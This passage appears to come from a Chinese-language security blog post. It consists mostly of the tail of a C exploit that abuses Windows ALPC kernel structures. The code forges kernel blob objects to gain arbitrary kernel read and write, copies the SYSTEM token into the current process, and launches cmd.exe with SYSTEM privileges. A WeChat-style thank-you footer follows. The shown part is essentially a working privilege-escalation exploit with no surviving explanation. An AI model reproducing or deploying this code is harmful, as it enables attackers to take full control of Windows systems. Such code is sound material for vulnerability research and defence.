  LIST_ENTRY tmpEntry;

  g_message -> ExtensionBuffer = (BYTE * ) ullPipeAttributeAddr + 0x20;
  g_message -> ExtensionBufferSize = 0x10;

  ULONG DataLength = 0x10;
  ALPC_MESSAGE * alpcMessage = (ALPC_MESSAGE * ) calloc(1, sizeof(ALPC_MESSAGE));
  alpcMessage -> PortHeader.u1.s1.DataLength = DataLength;
  alpcMessage -> PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + DataLength;
  alpcMessage -> PortHeader.MessageId = (ULONG) g_hResource;
  ULONG_PTR * pAlpcMsgData = (ULONG_PTR * )((BYTE * ) alpcMessage + sizeof(PORT_MESSAGE));
  pAlpcMsgData[0] = ullSystemEPROCaddr; // AttributeValue
  pAlpcMsgData[1] = 0x00787878; // name
  for (int i = 0; i < g_portCount; i++) {
    status = NtAlpcSendWaitReceivePort(g_ports[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE) alpcMessage, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
      printf("[-] Error\n");
      return FALSE;
    }
  }

  // read system token
  result = PipeReadAttr(pipeName, outputData, 0x1000);
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  ullToken = * (ULONG_PTR * )(outputData + tokenOffset);
  tmpEntry = g_message -> Entry;

  if (!isKernAddr(ullToken)) {
    printf("[-] Error\n");
    return FALSE;
  }

  PKALPC_BLOB blob;

  blob = (PKALPC_BLOB)(g_reserve) - 1;
  memset(blob, 0, sizeof(KALPC_BLOB) + sizeof(KALPC_RESERVE));
  blob -> Ref = 1;
  blob -> Type = AlpcReserveType;
  g_reserve -> Size = 0x28;
  g_reserve -> Message = g_message;

  blob = (PKALPC_BLOB)(g_message) - 1;
  memset(blob, 0, sizeof(KALPC_BLOB) + sizeof(KALPC_MESSAGE));
  blob -> Ref = 1;
  blob -> Type = AlpcMessageType;
  g_message -> Reserve = g_reserve;
  g_message -> ExtensionBuffer = (BYTE * ) ullEPROCaddr + tokenOffset;
  g_message -> ExtensionBufferSize = 8;

  DataLength = 8;
  memset(alpcMessage, 0, sizeof(ALPC_MESSAGE));
  alpcMessage -> PortHeader.u1.s1.DataLength = DataLength;
  alpcMessage -> PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + DataLength;
  alpcMessage -> PortHeader.MessageId = (ULONG) g_hResource;
  pAlpcMsgData[0] = ullToken;
  for (int i = 0; i < g_portCount; i++) {
    NtAlpcSendWaitReceivePort(g_ports[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE) alpcMessage, NULL, NULL, NULL, NULL, NULL);
  }
  g_message -> Entry = tmpEntry;

  STARTUPINFO StartupInfo = {
    0
  };
  PROCESS_INFORMATION ProcessInformation = {
    0
  };

  result = CreateProcess(
    L "C:\\Windows\\System32\\cmd.exe",
    NULL,
    NULL,
    NULL,
    FALSE,
    CREATE_NEW_CONSOLE,
    NULL,
    NULL, &
    StartupInfo, &
    ProcessInformation
  );
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  while (1) {};
}
```  
  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
